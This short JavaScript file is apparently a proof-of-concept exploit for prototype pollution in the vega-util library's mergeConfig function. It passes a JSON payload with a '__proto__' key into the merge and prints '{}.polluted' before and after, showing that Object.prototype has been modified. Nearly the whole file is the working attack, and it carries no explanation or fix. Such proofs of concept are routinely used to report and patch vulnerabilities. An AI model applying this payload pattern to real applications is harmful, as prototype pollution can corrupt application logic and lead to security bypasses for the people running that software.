var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const util = require('vega-util');
const config = '{style: {point: {shape: triangle-right}}}';
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
util.mergeConfig(config, JSON.parse(malicious_payload));
console.log({}.polluted);